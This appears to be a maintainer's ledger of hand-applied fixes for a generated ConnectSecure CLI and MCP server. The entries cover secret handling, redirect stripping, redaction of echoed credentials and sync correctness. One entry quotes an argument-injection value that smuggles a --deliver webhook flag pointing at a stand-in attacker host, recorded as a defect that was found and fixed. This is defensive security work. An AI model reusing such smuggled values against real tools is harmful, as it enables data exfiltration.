_comment: Edits inside GENERATED files and onboard-regenerated docs. Whole hand-authored files (internal/cli/connectsecure_*.go, the seven novel command files, internal/cliutil/connectsecure_secrets.go, internal/store/connectsecure_secrets.go, internal/client/connectsecure_nocache.go) survive regen by construction. The cli/ entries are also recorded in the press library's .printing-press-patches/.

handfixes.summary: No CREATE INDEX may name a column its table lacks; array-typed *_id fields (asset_view.unique_id, report_queries.suppression_id) never become columns.
handfixes.why: SQLite accepts the index as a string-literal expression, but ALTER TABLE DROP COLUMN then fails ('no such column'), failing the generated MCP checkpoint test and generate --validate.

handfixes.summary: defaultSyncResources() delegates to connectsecureDefaultSyncResources() (the curated core set). A bare sync runs no dependent; the per-asset registry dependent runs only when it or assets is named.
handfixes.why: The generated default synced all 137 listable resources on a bare sync, including credential and integration-secret endpoints. The generated `sync --help` example also labelled a bare sync '# Sync all resources'; it now says it syncs the curated default set (adversarial round 15). Adversarial round 16: parentFilter is empty on a bare sync, so dependents inherited 'sync everything' and the registry dependent fired one request per synced asset on every bare sync, contrary to the README's curated-set promise. TestBareSyncSkipsPerAssetDependent fails with the guard removed.

asserts.contains: # Sync the curated default resources (name others with --resources)

handfixes.summary: Credential and integration-secret rows, scheduled jobs (whose rows carry a password field), integration rules (integration_params), attack-surface results (creds and hashes fields), custom domains (undocumented cert_details) and the agent uninstall secret never reach the local store, the HTTP response cache, or auto-refresh.
handfixes.why: Those responses carry credential params or a password in plaintext; write-through, auto-refresh and the response cache would persist them under the CLI's data and cache dirs. Scheduler was added at onboard (2026-10-13) after the fresh-context review found the vendor spec's /r/company/scheduler GET returns a password field on every row: proven both directions against a mock serving a sentinel password - the pre-fix binary wrote it to cache/http and the SQLite store on a plain `scheduler list`, the fixed binary writes it nowhere. Codex review then found the typed writer upsertSchedulerTx still wrote the password column via UpsertScheduler (sync's single-object path) because only the generic resources insert was guarded; it is now guarded like upsertCredentialsTx, and TestSecretTypedWritersAreGuarded failed before the guard and passes after. Adversarial round 4 (2026-10-14) served sentinels in attack_surface_results.creds and integration_rules.integration_params on a mock pod and found each in the SQLite store, the HTTP cache and search; both resources were added to the list, their typed writers guarded, their auto-refresh entries removed, and TestSecretTypedWritersAreGuarded failed with the list entries removed and passes with them. Adversarial round 5 (2026-10-14) found custom_domains.cert_details is an undeclared object while custom-domains create uploads the TLS private key; with no live tenant to check what the GET echoes, custom_domains is treated as secret (store, cache and auto-refresh), and TestConnectsecureSecretTable plus TestConnectsecureDefaultSyncIsKnownAndSafe pin it. Codex round 5 then found upsertCustomDomainsTx unguarded (sync's refusal masked it); it is guarded and in TestSecretTypedWritersAreGuarded, which fails with the guard removed. Codex round 14 / adversarial round 14 (2026-10-14): the MCP context tool still listed the never-stored resources as syncable and searchable; handleContextResult now clears both for every store.NeverStoreResource name. TestContextDoesNotAdvertiseSecretResourcesAsSyncable fails with tools.go reverted.

asserts.contains: scheduler rows carry a password field
attack-surface rows carry creds and hashes

handfixes.summary: auth status treats CONNECTSECURE_TENANT + CLIENT_ID + CLIENT_SECRET as configured auth.
handfixes.why: The JWT is minted at runtime from those values, so a stored-token-only check reports a working setup as unauthenticated (exit 4).

handfixes.summary: Local reads treat the leading /r/ of ConnectSecure read paths as a route prefix.
handfixes.why: Otherwise /r/company/companies is read as companies under parent r=company and every --data-source local read (and the auto offline fallback) returns no rows.
handfixes.spec_encode_followup: Press retro: make the route-prefix list spec-configurable or detect single-letter verb prefixes.

handfixes.summary: Root help says ConnectSecure CLI.
handfixes.why: The template title-cases the slug instead of using the display name.

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)
handfixes.why: The press 4.33.5 recipe tool which_clients_does_this_cve_hit appends its `slug` tool-call argument as a positional AHEAD of the recipe's own flags with no flag-like check, so {"slug": "--deliver=webhook:https://attacker/"} became `cve-impact --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root --deliver flag. Proven both directions at onboard (2026-10-13): the new RejectsFlagLikePositional test FAILED against the unfixed handler (recorder showed `cve-impact --deliver=webhook:https://x/ --agent`) and passes with the fix, and the real connectsecure-mcp binary over stdio now returns `flag-like value ... not allowed for slug`. Same defect and fix as skills/acronis and skills/avanan (found by Codex adversarial review of the fleet mcp-argv-value-joined backport, 2026-09-09). cliArgsFromMCP in this print already emits joined --k=v values (press carries upstream #4647), but the recipe path is still unguarded in press 4.33.5, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.

handfixes.summary: manifest.json name/entry_point/command use the clean `connectsecure-mcp`, not the press `-pp-mcp`
handfixes.why: onboard.py re-copies the SOURCE manifest.json on every --resume; the printing-press source keeps `connectsecure-pp-mcp`, which names a binary the .mcpb bundle does not contain. The repo ships `connectsecure-mcp`.

handfixes.summary: The per-tenant pod URL (CONNECTSECURE_BASE_URL) plus the tenant, client ID and client secret that mint the token are declared, and required, on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md; optional variables are blank, not placeholders, in mcp-install.md.
handfixes.why: ConnectSecure hosts each tenant on its own pod (https://pod<N>.myconnectsecure.com) and config.go's default base URL (your-pod.myconnectsecure.com) is a non-functional placeholder, but the press derives the install prompts from auth_env_vars only, so the generated manifest asked only for an optional access token plus optional tenant/client fields and never for the pod URL - the .mcpb install could not work. Same class as hudu's per-instance-base-url-completed and issue #282. mcp-install.md's optional variables are emptied because a copied placeholder CONNECTSECURE_ACCESS_TOKEN is opaque, is treated as a live pre-minted token, and wins over minting from the client credentials, so every call would 401. manifest.json, server.json and mcp-install.md are all regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this entry a regeneration silently drops the pod URL again while check_env_schema stays green only if all three drop it together. 2026-10-22: the remote-agent (HTTP mode) prose this entry guarded was removed on purpose when the interim security note paused HTTP mode until the reprint; restore those markers with the post-reprint docs fix.
handfixes.spec_encode_followup: cli-printing-press should carry every required non-secret config var (the per-tenant base URL) into user_config + mcp env + docs, and emit blank values for optional variables in copy-paste env blocks.

asserts.contains: Open the Command Palette > **MCP: Open User Configuration** and add the block below.

handfixes.summary: SKILL.md carries a 'Safety for agents' section naming the credential reads, the endpoint-affecting writes and CONNECTSECURE_MCP_READ_ONLY, and its description leads with 'Use when the user asks to'.
handfixes.why: onboard.py re-vendors SKILL.md from the press source on every --resume. The generated SKILL.md never tells an agent that credentials list/get, integration-credentials list/get and agents uninstall-secret return stored secrets in plaintext, that patching patch-now and companies scan act on client machines, or that the MCP server has a read-only switch - an agent reading only SKILL.md would treat them as ordinary reads and writes.

attack-surface results (`attack-surface-results`, whose rows carry creds and hashes fields)
MCP tools also never take a local file path for the CLI to read

handfixes.summary: workflow archive drops secret-bearing resources (cliutil.ConnectsecureSecretResource) from its resource list before syncing.
handfixes.why: The generated archive list names every listable resource, including credentials, integration_credentials and scheduler. The store refuses those rows (secret-resources-never-persisted), which syncResource reports as an integrity failure, and archive aborts the whole run on the first one: on a mock pod the pre-fix binary exited 1 at `credentials`, so every resource alphabetically after it was never archived. The workflow_archive MCP tool exposes the same command.

handfixes.summary: exposure --help and the MCP context tool's exposure rationale/insight say the per-client vulnerability report lists assets only by ID, not that it lacks client names.
handfixes.why: The press-library novel text said ConnectSecure's vulnerability reports 'carry asset IDs but not client names'. That is false: problems_summary_group_by_companies returns company_id and company_name on every row, and exposure.go reads the name from it. A false statement about the vendor's product does not ship. exposure.go is hand-authored and survives a reprint, but a re-onboard from the unchanged press library would bring the old sentence back. The same false sentence also lived in the generated MCP context tool (internal/mcp/tools.go, the command-mirror rationale and the playbook insight every MCP agent reads first); round-2 adversarial review caught that twin.

asserts.not_contains: carry asset IDs but not client names

asserts.contains: lists affected assets only by ID
lists affected assets only by ID

handfixes.summary: The generic client's CheckRedirect deletes Client-Auth-Token (with Authorization and X-USER-ID) when a redirect leaves the origin.
handfixes.why: Client-Auth-Token is base64(tenant + '+' + client_id + ':' + client_secret), a reversible encoding of the secret. `session` and the MCP connectsecure_execute session.authorize endpoint send it through the generated client, whose redirect policy stripped only Authorization and X-USER-ID; Go itself strips only Authorization and Cookie. Found by Codex review (2026-10-13). TestClientAuthTokenDroppedOnCrossOriginRedirect routes a 307 to a hostname-based off-origin server and FAILED before the fix (the server received "SECRET") and passes after. The CLI's own mint path (connectsecure_auth.go) already refuses redirects. Codex round 11 (2026-10-14): config-file credential headers (X-Api-Key, Authorization overrides) still rode a cross-origin redirect, and a same-origin hop from an ordinary read onto a credential path would cache or write-through credential rows under the original resource. Every isSecretHeader header is now dropped off-origin, and a redirect onto a connectsecureNoCachePath from any other path is refused. TestConfiguredSecretHeaderDroppedOnCrossOriginRedirect and TestRedirectOntoCredentialPathRefused fail with those pieces reverted (mutation run) and pass with them. Adversarial round 12 / Codex round 12 (2026-10-14): the name-based header check still forwarded a configured header with an innocuous name (X-CS-Signature) off-origin; every config-file header is now dropped on a cross-origin hop. TestConfiguredSecretHeaderDroppedOnCrossOriginRedirect carries one and fails with that loop removed.

handfixes.summary: `session --client-auth-token -` reads the encoded token from stdin.
handfixes.why: The generated `session` command (POST /w/authorize) took the reversible base64 of tenant + client ID + client secret only as a flag value, so it landed in process arguments and shell history with no alternative. Found by Codex review (2026-10-13). Receipt on a mock pod: piping the token into the fixed binary with `--client-auth-token -` mints a JWT; the unfixed binary sends a literal '-' and gets 'Invalid client credentials'. The CLI mints its own token, so `session` is rarely needed.

asserts.contains: pass - to read it from stdin

handfixes.summary: CheckRedirect refuses a cross-origin redirect whenever the caller's original request was not GET or HEAD. On the same origin, a write answered with 301/302 (which Go replays as a bodiless GET) fails too; 303 is still followed.
handfixes.why: A 307/308 keeps the method and replays the body, and credentials, integration-credentials and scheduler writes carry passwords in the body; stripping headers alone (redirect-strips-client-auth-token) still sent the body to the other origin. Codex review 2026-10-14 confirmed a scheduler password reached another origin on a mock; TestWriteBodyNotReplayedCrossOrigin fails with the guard disabled and passes with it. Adversarial round 5 (2026-10-14) found 301/302/303 slipped past it: Go rewrites the POST into a bodiless GET before CheckRedirect runs, so the guard saw GET, the write never landed, and the CLI printed success:true. The check now reads via[0].Method; TestWriteNotDowngradedCrossOrigin fails for all three codes with req.Method and passes with via[0]. Adversarial round 6 found the same-origin 301/302 case still reported success:true with the GET body as data; TestWriteNotDowngradedSameOrigin fails for 301 and 302 with the check disabled and passes with it, and 303 stays followed. Adversarial round 7: checking via[0] failed a same-origin 303-then-302 chain whose write had landed; both checks now read the hop being redirected (via[len(via)-1]), and TestWriteRedirectChainChecksTheLastHop fails with via[0].

asserts.contains: refusing to replay a %s request body to another origin
if m := via[len(via)-1].Method; m != http.MethodGet && m != http.MethodHead {

handfixes.summary: The generic client's transport-error branch (client.go, after httpClient.Do) passes the error through connectsecureTransportError (hand-authored connectsecure_redact.go), which withholds it when its text echoes a secret the request carried. Both the returned error and the retry notice on stderr use the withheld form. The CLI's own request URL and host are dropped from the text before matching (a DNS error names the host), so a secret that only coincides with them does not hide the real cause.
handfixes.why: Codex round 19 (2026-10-14): a refused redirect's *url.Error names its Location, so a pod answering a scheduler or credential write with `302 Location: /error?password=<submitted>` printed the password, including one read from --stdin. TestRefusedRedirectDoesNotEchoTheSubmittedSecret fails with the call reverted (verified). The token mint uses its own request, which never follows a redirect and drops the URL from its transport errors. Adversarial round 21: the first cut matched the whole error text, so a password that happened to be a substring of the pod host hid a DNS failure. TestTransportErrorKeptWhenOnlyOurURLMatches fails without the strip (verified).

handfixes.summary: --dry-run masks secret-named body fields (password, secret, token, params and similar) before printing the request preview.
handfixes.why: The generated dryRun printed the request body verbatim, so `scheduler create --stdin --dry-run` echoed the job password to stderr, where agent transcripts keep it (Codex review 2026-10-14). The redactor lives in the hand-authored internal/client/connectsecure_redact.go; TestDryRunRedactsSecretBody fails with the call removed and passes with it.

handfixes.summary: doctor verifies the credential with an authenticated GET /r/company/companies?limit=1 instead of printing 'present, not verified'; a 404 there turns the api row red, and a failed token mint (which runs inside client init) is the credentials verdict.
handfixes.why: Measured by tools/maintainer/check_doctor_truth.py (issue #282). The 4.33.5 doctor failed that gate on this connector: 'present, not verified' in the healthy state, an HTML 200 at / read as a healthy API in the wrong-base state, and an identical credentials verdict whether the credential worked or not. After the fix the gate passes; it failed in the verify_all run before it. Codex round 11 (2026-10-14): an HTTP 200 that was not the status envelope (plaintext 'Access denied', a gateway page, {}) still read as valid; doctor now requires the status field. TestDoctorRequiresTheStatusEnvelope fails with the check reverted. Adversarial round 13 (2026-10-14): requiring the status field broke tools/maintainer/check_doctor_truth.py, whose healthy stub answers 200 {"data":[],"items":[],"results":[]}; doctor now verifies on status:true or, with no status, a data key, so {} and plaintext still fail and the gate passes (checked with --slug connectsecure). A 200 status:false now arrives as an APIError and lands in the 'ERROR rejected' branch. Codex round 14 / adversarial round 14 (2026-10-14): any `data` member counted ({"data":null} and a string read as valid); the data member must now be a JSON list.

handfixes.summary: Every refresh hint the binary and MCP server give names `sync --full`: the stale-store hint, doctor's stale-cache hint, the sync help, the MCP no-match and store-error next steps, and the context tool's query tips.
handfixes.why: A bare re-sync only adds and updates rows; only --full prunes findings remediated since the last sync, so a bare refresh keeps reporting them as open in exposure and portfolio. Adversarial round 4 (2026-10-14) found the docs said --full while the binary's own stale hint, forwarded to MCP agents, still said a bare sync. Adversarial round 5 found doctor's stale-cache hint still said a bare sync, and the sync help still offered `--since 7d` as an incremental sync although this API has no temporal filter; both fixed.

asserts.contains: Short: "Sync API data to local SQLite for offline search and analysis (refresh with --full)"
re-run sync with --full if data may be stale
Refresh the local store with sync --full

asserts.not_contains: Incremental sync: only records from the last 7 days

asserts.contains: ConnectSecure has no time filter, so each resource warns and syncs in full

handfixes.summary: sync refuses a secret resource (credentials, scheduler, custom_domains and the rest of the cliutil list) before any request, with a never-stored message, and doctor leaves those resources out of its staleness verdict.
handfixes.why: Adversarial round 5 (2026-10-14): `sync --resources credentials` downloaded the secret rows over the wire, discarded them, and reported a phantom all_items_failed_id_extraction anomaly that sends an agent debugging primary keys; the never-synced sync_state rows it left then kept doctor's cache check stale forever. TestSyncRefusesSecretResourcesBeforeFetching fails (fetches, then panics on the nil store) with the guard disabled and passes with it. Adversarial round 6 found the reason reached only --human-friendly output; machine modes now get a sync_error event with reason never_stored_by_design, which the test asserts.

handfixes.summary: An explicit false on an MCP tool call reaches a bool flag whose default is true (tail --follow), as a joined --flag=false.
handfixes.why: cliArgsFromMCP emits a bool only when it is true, so `follow: false` was dropped, `tail` ran with --follow=true and the MCP call never returned (the shellout has no timeout), including against credential resources. Press-level defect; keepExplicitFalse in guardMirroredMCPCall rewrites only default-true bool flags, so Changed() on default-false flags is untouched. TestKeepExplicitFalseReachesDefaultTrueFlag fails with the call removed and passes with it.

handfixes.summary: The which_clients_does_this_cve_hit recipe tool is annotated read-only and non-destructive.
handfixes.why: The generated recipe set only the open-world hint, so tools/list advertised a GET-only lookup as destructive (MCP default) and clients gated or denied it; the cve_impact tool it shells out to was already read-only.

handfixes.summary: Onboard-regenerated docs keep the round-5 corrections: guide.md's Secrets section and true .mcpb platform list, mcp-install.md's VS Code secret input, and manifest.json's pod URL wording.
handfixes.why: Adversarial round 5 (2026-10-14): guide.md (the full command reference) had no credential tier, tail, --stdin or envelope note; it claimed .mcpb bundles for darwin-arm64 and windows-arm64, while mcpb_bundle.py ships universal darwin, linux-amd64 and windows-amd64; mcp-install.md put the client secret in plaintext in a workspace .vscode/mcp.json; and manifest.json pointed at the portal address bar, which before sign-in is portal.myconnectsecure.com, a host doctor rejects.

asserts.contains: `export` and `tail` stream bare JSON records in either mode.
credential reads still pass, so scope the API user too.
hide the sync, export and tail tools (import is never an MCP tool)

handfixes.summary: An API error body (and a token-mint error) that echoes any secret the request carried - in raw, JSON-escaped, double-escaped or URL-escaped form, a PEM private key, or a value cut at the truncation point - is withheld whole; otherwise secret-named JSON fields are masked (booleans and nulls kept).
handfixes.why: Codex round 5 (2026-10-14): only the configured auth header was masked, so a 4xx that echoed the request put scheduler passwords, credential params or a Client-Auth-Token into error text, even when the secret came in on stdin. TestErrorBodyMasksEchoedSecrets fails with the redaction removed and passes with it. Adversarial round 7 and Codex round 6 then broke the first version (masking in place after json.Marshal): passwords with & < > " \ survived as JSON escapes, secrets under 4 characters were skipped, a value straddling the 4096-byte cut leaked its prefix, custom-domains create's multipart ssl_privkey part was never collected, and the token mint (its own HTTP path) printed an echoed Client-Auth-Token. Withholding on any detected form, checked before truncation, closes all five; TestErrorBodyWithheldWhenItEchoesASecret (each case) and TestMintWithholdsAnEchoedCredential fail with the checks disabled and pass with them, and the multipart case fails with only the multipart parser disabled. Adversarial round 8 and Codex round 7 then showed the encoded-form list missed other servers' JSON escapes (Python ensure_ascii \u00e9, PHP \/, .NET uppercase \u002B, Gson \u003d), HTML entities and Latin-1, which the display path decoded back into plaintext; detection now runs on decoded views (a one-pass JSON/JS unescaper applied repeatedly, html.UnescapeString, URL unescapes, Latin-1) and also on the text as displayed, covers 2xx HTML summaries, adds the decoded Client-Auth-Token and its client secret, and collects only secret-named leaves plus 6+ character strings under params, so a port or type no longer withholds a validation error. TestEchoDetectedInEveryEncoderShape fails with the decoded views disabled; TestErrorBodyKeepsShortNonSecretParams, TestDecodedClientAuthTokenIsASecret and TestHTMLSuccessSummaryWithheldWhenItEchoes each fail with their piece disabled. Adversarial round 9 and Codex round 8: the decoder gained \xNN, \b and \f escapes, a NUL-stripped view for UTF-16 bodies, and a 16-character head/tail match for secrets of 32+ characters (servers that cut long values); the CLI's own bearer token joined the withhold set on the error and 2xx HTML paths; known account/target keys under params (username, domain, host, port, type...) no longer withhold an error that names them. The encoder-shape test now holds every secret only in encoded form (it fails if a case contains plaintext), and a scripted mutation run showed each piece's test failing with that piece removed. Adversarial round 10 and Codex round 9: a 200 {"status": false} message printed by csGetData (qbr, cve-impact, the MCP recipe) and by doctor skipped both the echo check and token masking - both now go through Client.SafeServerText - and a GET answered 200 status:false that echoes a request or token secret is now an error, so it is never cached or printed as data. TestStatusFalseMessageWithholdsTheToken and TestGetStatusFalseEchoIsAnError fail with those pieces removed. The hex decoding was rewritten (hexRune) so gosec G115 has no integer narrowing to flag. Codex round 10: secrets in the config file's headers (sent on every request) joined the withhold set via connectsecureSentHeaders, with Authorization/Cookie/*key* header names counted as credential headers; and UTF-16 bodies are decoded as real code units in both byte orders and alignments, so a non-ASCII secret is seen whole. TestConfiguredHeaderSecretIsWithheld and TestEchoDetectedInUTF16 each fail with their piece disabled (scripted mutation run). Codex round 11 (2026-10-14): a configured Authorization override contributed only its whole value, so a short bearer token echoed without the scheme escaped; the bare token now joins the withhold set. TestConfiguredBearerTokenEchoWithheld fails with that line reverted.

handfixes.summary: A dependent resource whose parent table is empty records a completed zero-row sync instead of leaving its attempt row open.
handfixes.why: Adversarial round 6 (2026-10-14): the curated default sync fills asset_view, not assets, so the per-asset report_queries dependent always found zero parents and left a sync_state row with no completed time; doctor read it as never synced and reported the cache stale straight after `sync --full`. TestDependentWithNoParentsCompletes fails without the SaveSyncState and passes with it.

handfixes.summary: list/get for scheduler, integration rules, attack-surface results and custom domains read live only, like credentials.
handfixes.why: Adversarial round 6 (2026-10-14): with the auto strategy, --data-source local or an unreachable API told the user to run sync, which refuses these resources by design, sending an agent into a sync loop. Live-only gives the accurate 'no local data source for this command' message.

handfixes.summary: A 2xx response whose body is the vendor's failure envelope {"status": false} is returned as an API error (with the same secret withholding) for every method: never success:true for a write, never an empty result for a read.
handfixes.why: Adversarial round 8 (2026-10-14): the ConnectSecure spec documents only 200 responses with a boolean status, and the token mint and doctor already treat 200 status:false as a failure, but generated writes reported it as success:true with rc 0, so an agent would tell the user a credential, suppression or patch schedule was created when it was not; the echoed message also skipped withholding. GETs are unchanged (an empty list may use the same envelope). TestWriteStatusFalseIsAnError fails with the check disabled. Codex round 8: a BOM- or XSSI-prefixed body hid the envelope; the check now reads sanitizeJSONResponse(respBody), and TestWriteStatusFalseBehindBOMIsAnError fails without it. Adversarial round 13 (2026-10-14): GETs were exempt, so list / get / export / tail printed a refused read as an empty result with exit 0 and cached it for 5 minutes, while sync, qbr, cve-impact, doctor and the mint read the same bytes as a refusal. The spec types status as a boolean success flag and no vendor doc defines status:false as 'no records', so the loud reading wins everywhere: a refusal surfaced as an error beats an agent telling an MSP the client has no credentials or suppressions. TestWriteStatusFalseIsAnError now also asserts the GET is an error and fails with GET exempted again.

handfixes.summary: The HTTP 400 auth heuristic reads the API error body, not the full message, so the request path /r/company/credentials does not turn every 400 into an auth failure (exit 4).
handfixes.why: Adversarial round 8 (2026-10-14): LooksLikeAuthError matched \bcredential in the URL path, so a 'name already exists' 400 on credentials create printed 'auth is missing or invalid' and exited 4, steering an agent to re-run auth setup. TestCredentialsPathIsNotAnAuthSignal fails with the old msg argument. Adversarial round 9: the body still tripped it ('Credential name already exists'); a body that reads as a validation error (already exists, required, must be, between, invalid value, not valid, duplicate) is no longer an auth signal. TestValidationMessageIsNotAnAuthSignal fails without that list. Adversarial round 10: the validation words also matched real auth messages ('Authorization token is required'); a body naming a token, API key, authorization, authentication or expiry stays an auth signal first. TestAuthMessageKeepsTheAuthHint fails with that check disabled.

handfixes.summary: doctor's HTML-accepting reachability probe (GET /) neither reads nor writes the response cache, and an echoing 200 status:false credential rejection is reported as rejected.
handfixes.why: Codex round 9 (2026-10-14): the probe opts into HTML responses, which skip the HTML echo guard, and went through the cached GET, so a 200 HTML page echoing the bearer token could be written to the on-disk response cache. Adversarial round 11: GetWithHeadersNoCache only skipped the cache read and still wrote the HTML page (echoed token included) to cache/http; doctor's client now runs with NoCache. TestDoctorWritesNoCache drives `doctor --json` against an HTML root that echoes the token and fails with NoCache removed. An echoing 200 status:false became a withheld APIError that doctor read as WARN not verified (exit 0 under --fail-on error); a 2xx APIError is now ERROR rejected (TestDoctorEchoingRejectionIsAnError fails with that case removed).

handfixes.summary: Resources the local reports read (the curated default sync set) are replaced on sync instead of keep-richer merged.
handfixes.why: Codex round 9 (2026-10-14): the generated merge keeps an existing value when the fresh row has the field empty or null, so a suppression whose approved_by was cleared kept its old approver and suppression-audit missed it. TestClearedFieldIsNotKeptOnResync fails with the replace disabled; TestLocalReportResourcesAreReplacedOnSync keeps the list in step with connectsecureDefaultSyncResources.

handfixes.why: Adversarial round 11 (2026-10-14): tail polls any resource live, including credentials and scheduler, and printed their passwords; with readOnlyHint true MCP hosts ran it without asking and CONNECTSECURE_MCP_READ_ONLY=1 still listed it, while governance puts `tail` on those resources in the human-in-the-loop credential tier and connectsecure_execute (the same read) is gated. handfixes.why: Codex round 11 (2026-10-14): both wrote to os.Stdout directly, so `export companies --deliver file:<path>` replaced the destination with an empty file and a webhook got an empty body, while the command reported success. handfixes.summary: sync treats a boolean {"status": false} envelope as a declared failure, flat and dependent.
handfixes.why: Adversarial round 12 / Codex round 12 (2026-10-14): ConnectSecure refuses a read as HTTP 200 {"status": false, "data": []}; the generated check only knew string statuses, so `sync --full` read the refusal as an empty resource, pruned every cached row and marked the resource complete with exit 0. TestSyncStatusFalseIsAFailure fails with the bool branch removed. Adversarial round 13 (2026-10-14): the client now raises the same envelope as an API error before sync sees it (write-status-false-is-an-error), so this branch is the backstop for bodies that reach extraction another way.

handfixes.summary: Report resources whose rows share a display name across clients are keyed by a per-client identity in both resourceIDFieldOverrides maps (store.go and sync.go): object_guid for AD OUs, GPOs and group computers; company_id (with compliance_id) for per-client rollups; company_id+solution_id for remediation-plan-by-company; name+value, asset_id+key (external-asset-vulnerabilities), solution_id, company_name+canonical_name, agent_id?+host_name?+ip?+name+version? and company_id?+agent_id?+host_name?+ip?+vul_id+port?+discovered? elsewhere. A trailing "?" (handled in canonicalCompositeIDFromOverride and overrideIdentityPresent) marks a part a row may lack: it joins as empty instead of dropping the row to the generic chain. Codex round 19 widened patching-asset-details (agent_id?+host_name?+ip?+name+version?: one discovery agent scans many machines), and compliance-check-company-count (+compliance_status?+platform?: pass and fail buckets are separate rows). Array-typed fields (software_name and port lists, app path in the spec) are per-row aggregates that change and reorder between syncs, so none is added as a key part; patching-asset-details keeps the name and version arrays its round-14 key already used, which keep different applications' rows apart.
handfixes.why: Codex round 14 / adversarial round 14 (2026-10-14): the generator keyed these by `name`, so `sync --full --resources report_queries-ad-ous-view` kept only the last client's 'Workstations' OU and exited 0 - and every AD domain carries a 'Default Domain Policy' GPO, so ad-gpos-view collapsed the same way. A row missing a key part falls back to the generic id chain (id, then name, the old behavior), so such rows can still collapse into one; Codex round 17 (2026-10-14): host_name+ip+vul_id collapsed one CVE found on two ports of a host, or in two products on it. The key now adds port and software_name as optional parts, since a non-network finding may carry no port and a required part would send it to the name fallback. Codex round 18 + adversarial round 19: the key still lacked client identity and required host_name, which network-discovered assets often leave blank. Every part except vul_id is now optional, and company_id, agent_id and discovered (first-seen time, stable per finding) are added; software_name is not, because the spec types it as an array: the spec's asset_wise_vulnerabilities rows carry no client field, so company_id and agent_id discriminate only if the live API sends them, and discovered separates two clients' identical builds found at different times. Two rows that match on every one of those fields (the same host name, IP, port, CVE, product and first-seen time at two clients, with no client id) still share a row: the accepted residual, since nothing in the row tells them apart. TestPerClientReportRowsKeepDistinctIDs fails with the round-17 key restored (verified). Codex round 19 (2026-10-14): a sweep of every override against the spec's row fields found two more merges: one agent's two scanned machines with the same app and version, and a check's passing and failing bucket for one client (a later passing bucket erased the failing assets). Optional parts are used wherever a row might lack the field. TestPerClientReportRowsKeepDistinctIDs fails with the round-18 store.go (verified, 5 collisions). Adversarial round 21: that round had also added software_name and port to the three problem summaries, but the spec types both as arrays, so a reordered or changed list minted a second row beside the stale one on a plain sync, doubling portfolio's critical/high counts and exposure's rows. Reverted to problem_name / problem_name+company_id / problem_name+company_id+fix, and software_name (asset-wise) and path (patching) dropped for the same reason. TestPerClientReportRowsKeepDistinctIDs now also asserts that changing an array field leaves the id unchanged; it fails with the round-19 store.go (verified, 3 cases). Codex round 20: the composite resolver refused any part that parses as zero, so distinct-tags rows rack=0 and rack=00 both fell back to the name key. Only a numeric zero (a placeholder id) is refused now; a string "0" is data. The distinct-tags case in TestPerClientReportRowsKeepDistinctIDs fails with the type check removed (verified). Codex round 22: external-asset-vulnerabilities rows (asset_id, key, value) fell back to the key alone, so two assets carrying the same finding key kept one row. Keyed asset_id+key. A probe of the real resolver over a spec-shaped row for every one of the 210 read partitions found no other per-entity report keyed on a shared descriptive field; the external-asset-vulnerabilities case in TestPerClientReportRowsKeepDistinctIDs fails with the entry removed (verified).

handfixes.summary: flatReconcileModes (sync.go) lists report_queries-event-tickets, report_queries-external-asset-vulnerabilities and report_queries-remediate-records-companies as flat_global, so a --full sync prunes rows the pod no longer returns, as it already did for report_queries-distinct-tags.
handfixes.why: Adversarial round 24 (2026-10-14): these three are the only report partitions outside the reconcile table that store rows at all (the other 57 fail sync with no extractable id or need required params), and the generator left them out. So every --full ended in reconcile_skipped and exited 0, while a remediated external finding stayed in the mirror for good and --data-source local returned it with a fresh synced_at. README and SKILL.md say a --full run prunes remediated findings. Each now has a stable id (asset_id+key from per-client-report-keys, ticket_id, company_id). TestFullSyncPrunesExternalAssetFindings fails with the entries removed (verified).

handfixes.summary: loadLocalList (data_source.go) calls csRefuseParentScopedParams, which moves object_guid from an equality filter to a refused row-selecting param for report-queries ad-group-computers and ad-group-users, so a local read fails closed ('local data could not apply object_guid; use --data-source live') instead of returning an empty group.
handfixes.why: Codex round 17 (2026-10-14): those reports take the GROUP's object_guid as a query param, but each returned member row's object_guid is the member's own. The generated local filter matched the param against the row field, so --data-source local and the auto fallback for an unreachable pod returned zero members for a cached non-empty group, exit 0. A spec scan of every GET whose query param shares a name with a response field found only these two with different meanings (get-user-details, get-computer-details and ad-roles-details look up the row itself). The map lives in hand-authored connectsecure_local.go. TestReportQueriesLocalReadReturnsOnlyThatReport fails with the call removed (verified).

handfixes.summary: Every generated report-queries <report> command caches into and reads locally from the partition sync writes for that report (report_queries-<report>), not the shared report_queries bucket. registry-problems-remediation-asset-details uses report_queries, where sync's per-asset dependent of that name stores its rows. ad-computers-view, which sync never fetches, gets its own partition keyed by object_guid.
handfixes.why: Adversarial round 15 (2026-10-14): all 162 report-queries commands passed resourceType "report_queries" to resolvePaginatedReadWithStrategy, so live write-through keyed every report's rows by name in one bucket. One client's 'Workstations' OU overwrote another's, and with the default --data-source auto an unreachable pod served other reports' rows (GPOs, ports, tags) as the OU report with exit 0. The per-client keys of per-client-report-keys reached only sync. TestReportQueriesCommandsUseOwnPartition scans every report_queries_*.go and TestReportQueriesLocalReadReturnsOnlyThatReport drives ad-ous-view + ad-gpos-view through a stub pod and reads ad-ous-view back locally; both fail with the 161 files reverted. Adversarial round 16 + Codex round 16: the first cut left ad-computers-view on report_queries on the false premise that sync stores its rows there. flatSyncResources drops the flat report_queries resource because a dependent shares the name, so that partition holds only the registry dependent's per-asset rows, and local ad-computers-view served them as AD computers. The ad-computers-view rows also keyed by name, collapsing two clients' RECEPTION into one. Reverting store.go's report_queries_ad_computers_view override, or either command file, fails TestReportQueriesLocalReadReturnsOnlyThatReport / TestReportQueriesCommandsUseOwnPartition.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
